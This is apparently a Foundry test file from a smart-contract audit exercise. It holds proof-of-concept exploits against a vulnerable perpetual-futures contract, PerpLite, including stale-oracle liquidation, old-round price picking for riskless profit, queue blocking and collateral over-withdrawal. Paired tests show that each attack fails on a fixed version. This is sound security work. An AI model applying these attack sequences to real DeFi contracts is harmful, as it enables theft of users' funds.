// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {console2} from "forge-std/console2.sol";
import {Base, IPerp, RevertingTrader} from "./Base.sol";
import {IERC20Lite, PerpLite} from "../src/PerpLite.sol";
import {PerpLiteFixed, IERC20Lite as IERC20LiteFixed} from "../solution/PerpLiteFixed.sol";

/// @notice 每个 PoC 在有漏洞的版本上通过，证明问题存在。
contract PoC is Base {
    function _deploy() internal override returns (IPerp) {
        return IPerp(address(new PerpLite(IERC20Lite(address(usd)), oracle)));
    }

    function test_F01_staleOracleLiquidatesHealthyPosition() public {
        _open(alice, true, 10_000e6, 2_000e6);
        _open(bob, false, 10_000e6, 2_000e6); // 多空平衡，资金费为 0
        _mark(2415e8);
        // 喂价停了 2 天。假设场外价格已回到 3000。
        vm.warp(block.timestamp + 2 days);
        vm.prank(mallory);
        perp.liquidate(alice, true);
        (uint256 size, , , ) = perp.positions(alice, true);
        assertEq(size, 0, "alice was liquidated on a 2-day-old price");
    }

    function test_F02_executorPicksOldRoundForRisklessProfit() public {
        _mark(3300e8); // 第 2 轮：涨 10%。第 1 轮仍是 3000。
        uint256 beforeBal = usd.balanceOf(mallory);

        vm.prank(mallory);
        perp.requestIncrease{value: ETH_FEE}(true, 100_000e6, 20_000e6, type(uint256).max);
        vm.prank(mallory);
        perp.executeNext(1); // 用下单之前的旧价开仓

        vm.prank(mallory);
        perp.requestClose{value: ETH_FEE}(true, 0);
        _mark(3300e8);
        _execLatest();

        int256 profit = int256(usd.balanceOf(mallory)) - int256(beforeBal);
        console2.log("F02 profit (6 decimals)", profit);
        assertGt(profit, 9_000e6);
    }

    function test_F03_revertingRefundBlocksQueue() public {
        RevertingTrader bad = new RevertingTrader();
        usd.mint(address(bad), 10_000e6);
        bad.open{value: ETH_FEE}(perp, usd, 10_000e6, 2_000e6);

        vm.prank(alice);
        perp.requestIncrease{value: ETH_FEE}(true, 10_000e6, 2_000e6, type(uint256).max);

        _mark(P3000);
        uint256 round = oracle.latestRoundId();
        vm.prank(keeper);
        vm.expectRevert(bytes("refund"));
        perp.executeNext(round);

        assertEq(perp.head(), 0, "queue never moves");
        assertEq(perp.tail(), 2, "alice is stuck behind the attacker");
    }

    function test_F04_oiChangeRepricesPastFunding() public {
        _open(alice, true, 10_000e6, 2_000e6);
        _open(bob, false, 10_000e6, 2_000e6);
        vm.warp(block.timestamp + 7 days); // 这 7 天多空完全平衡，资金费应为 0
        oracle.push(P3000);

        _open(sock, true, 100_000e6, 20_000e6); // 偏斜被套用到过去 7 天

        (, uint256 bobCollateral, , ) = perp.positions(bob, false);
        uint256 beforeBal = usd.balanceOf(bob);
        _close(bob, false);
        uint256 payout = usd.balanceOf(bob) - beforeBal;
        console2.log("F04 bob funding income", payout - bobCollateral);
        assertGt(payout, bobCollateral + 1_000e6);
    }

    function test_F04b_increaseErasesOwedFunding() public {
        _open(alice, true, 10_000e6, 2_000e6); // 只有多头，多头持续付资金费
        vm.warp(block.timestamp + 7 days);
        oracle.push(P3000);
        perp.accrueFunding();
        int256 beforeIncrease = perp.equityAt(alice, true, P3000);

        _open(alice, true, 100e6, 2_000e6); // 加一点仓位

        int256 afterIncrease = perp.equityAt(alice, true, P3000);
        console2.log("F04b funding forgiven", afterIncrease - beforeIncrease - 2_000e6);
        assertGt(afterIncrease - beforeIncrease, 3_500e6);
    }

    function test_F05_underwaterPositionCannotBeLiquidated() public {
        _open(alice, true, 10_000e6, 2_000e6);
        _mark(1200e8); // 跌 60%，亏损 6000，保证金只有约 2000
        assertLt(perp.equityAt(alice, true, 1200e8), 0);
        vm.prank(mallory);
        vm.expectRevert();
        perp.liquidate(alice, true);
        (uint256 size, , , ) = perp.positions(alice, true);
        assertEq(size, 10_000e6, "bad position stays open");
    }

    function test_F06_removeCollateralIgnoresUnrealizedLoss() public {
        _open(mallory, true, 10_000e6, 2_000e6);
        _mark(2550e8); // 跌 15%，亏损 1500，真实权益约 490
        uint256 beforeBal = usd.balanceOf(mallory);
        vm.prank(mallory);
        perp.removeCollateral(true, 990e6);
        assertEq(usd.balanceOf(mallory) - beforeBal, 990e6, "took more than true equity");
        assertLt(perp.equityAt(mallory, true, 2550e8), 0, "position is now bad debt");
    }

    function test_F07_arithmeticAverageEntryOverpaysShort() public {
        _open(mallory, false, 1_000e6, 500e6);
        _mark(1500e8);
        _open(mallory, false, 1_000e6, 500e6);
        (, uint256 collateral, uint256 entry, ) = perp.positions(mallory, false);
        assertEq(entry, 2250e8, "arithmetic mean");
        // 真实盈亏：第一笔从 3000 到 1500 赚 500，第二笔赚 0
        int256 equity = perp.equityAt(mallory, false, 1500e8);
        int256 pnl = equity - int256(collateral);
        console2.log("F07 reported pnl", pnl);
        assertGt(pnl, 660e6);
    }

    function test_F08_liquidationLeavesOpenInterest() public {
        _open(alice, true, 10_000e6, 2_000e6);
        _mark(2415e8);
        vm.prank(mallory);
        perp.liquidate(alice, true);
        (uint256 size, , , ) = perp.positions(alice, true);
        assertEq(size, 0);
        assertEq(perp.longOI(), 10_000e6, "ghost open interest");
    }
}

/// @notice 同样的场景跑在修复版上，证明问题消失。
contract FixProofs is Base {
    function _deploy() internal override returns (IPerp) {
        return IPerp(payable(address(new PerpLiteFixed(IERC20LiteFixed(address(usd)), oracle))));
    }

    function _fixed() internal view returns (PerpLiteFixed) {
        return PerpLiteFixed(payable(address(perp)));
    }

    function test_fix_F01_stalePriceRejected() public {
        _open(alice, true, 10_000e6, 2_000e6);
        _open(bob, false, 10_000e6, 2_000e6);
        _mark(2415e8);
        vm.warp(block.timestamp + 2 days);
        vm.prank(mallory);
        vm.expectRevert(PerpLiteFixed.StalePrice.selector);
        perp.liquidate(alice, true);
    }

    function test_fix_F02_oldRoundRejected() public {
        _mark(3300e8);
        vm.prank(mallory);
        perp.requestIncrease{value: ETH_FEE}(true, 100_000e6, 20_000e6, type(uint256).max);
        vm.prank(mallory);
        vm.expectRevert(PerpLiteFixed.WrongRound.selector);
        perp.executeNext(1);
    }

    function test_fix_F02_laterRoundAlsoRejected() public {
        vm.prank(mallory);
        perp.requestIncrease{value: ETH_FEE}(true, 100_000e6, 20_000e6, type(uint256).max);
        _mark(3100e8); // 第一轮
        _mark(2900e8); // 第二轮：执行者不能挑这一轮
        uint256 second = oracle.latestRoundId();
        vm.prank(mallory);
        vm.expectRevert(PerpLiteFixed.WrongRound.selector);
        perp.executeNext(second);
        vm.prank(mallory);
        perp.executeNext(second - 1);
        (, , uint256 entry, ) = perp.positions(mallory, true);
        assertEq(entry, 3100e8);
    }

    function test_fix_F03_queueMovesPastRevertingOwner() public {
        RevertingTrader bad = new RevertingTrader();
        usd.mint(address(bad), 10_000e6);
        bad.open{value: ETH_FEE}(perp, usd, 10_000e6, 2_000e6);
        vm.prank(alice);
        perp.requestIncrease{value: ETH_FEE}(true, 10_000e6, 2_000e6, type(uint256).max);

        _mark(P3000);
        _execLatest();
        _execLatest();
        assertEq(perp.head(), 2);
        (uint256 size, , , ) = perp.positions(alice, true);
        assertEq(size, 10_000e6);
    }

    function test_fix_F03_slippageCancelsAndRefunds() public {
        uint256 beforeBal = usd.balanceOf(alice);
        vm.prank(alice);
        perp.requestIncrease{value: ETH_FEE}(true, 10_000e6, 2_000e6, 1e8); // 价格上限 1 美元，必定失败
        _mark(P3000);
        _execLatest();
        assertEq(perp.head(), 1);
        assertEq(usd.balanceOf(alice), beforeBal, "collateral returned");
    }

    function test_fix_F04_noRetroactiveFunding() public {
        _open(alice, true, 10_000e6, 2_000e6);
        _open(bob, false, 10_000e6, 2_000e6);
        vm.warp(block.timestamp + 7 days);
        oracle.push(P3000);
        _open(sock, true, 100_000e6, 20_000e6);
        (, uint256 bobCollateral, , ) = perp.positions(bob, false);
        uint256 beforeBal = usd.balanceOf(bob);
        _close(bob, false);
        uint256 income = usd.balanceOf(bob) - beforeBal - bobCollateral;
        assertLt(income, 1e6, "only seconds of real skew");
    }

    function test_fix_F04b_increaseSettlesOwedFunding() public {
        _open(alice, true, 10_000e6, 2_000e6);
        vm.warp(block.timestamp + 7 days);
        oracle.push(P3000);
        perp.accrueFunding();
        int256 beforeIncrease = perp.equityAt(alice, true, P3000);
        _open(alice, true, 100e6, 2_000e6);
        int256 afterIncrease = perp.equityAt(alice, true, P3000);
        assertApproxEqAbs(afterIncrease - beforeIncrease, 2_000e6, 2e6, "only new margin minus fee");
    }

    function test_fix_F05_underwaterLiquidates() public {
        _open(alice, true, 10_000e6, 2_000e6);
        _mark(1200e8);
        vm.prank(mallory);
        perp.liquidate(alice, true);
        (uint256 size, , , ) = perp.positions(alice, true);
        assertEq(size, 0);
        assertEq(perp.longOI(), 0);
        assertGt(_fixed().badDebt(), 0, "shortfall recorded");
    }

    function test_fix_F06_removeCollateralChecksEquity() public {
        _open(mallory, true, 10_000e6, 2_000e6);
        _mark(2550e8);
        vm.prank(mallory);
        vm.expectRevert(bytes("equity"));
        perp.removeCollateral(true, 990e6);
    }

    function test_fix_F07_harmonicEntry() public {
        _open(mallory, false, 1_000e6, 500e6);
        _mark(1500e8);
        _open(mallory, false, 1_000e6, 500e6);
        (, uint256 collateral, uint256 entry, ) = perp.positions(mallory, false);
        assertApproxEqAbs(entry, 2000e8, 1e4, "harmonic mean");
        int256 pnl = perp.equityAt(mallory, false, 1500e8) - int256(collateral);
        assertApproxEqAbs(pnl, 500e6, 1e3);
    }

    function test_fix_F08_liquidationClearsOpenInterest() public {
        _open(alice, true, 10_000e6, 2_000e6);
        _mark(2415e8);
        vm.prank(mallory);
        perp.liquidate(alice, true);
        assertEq(perp.longOI(), 0);
    }
}
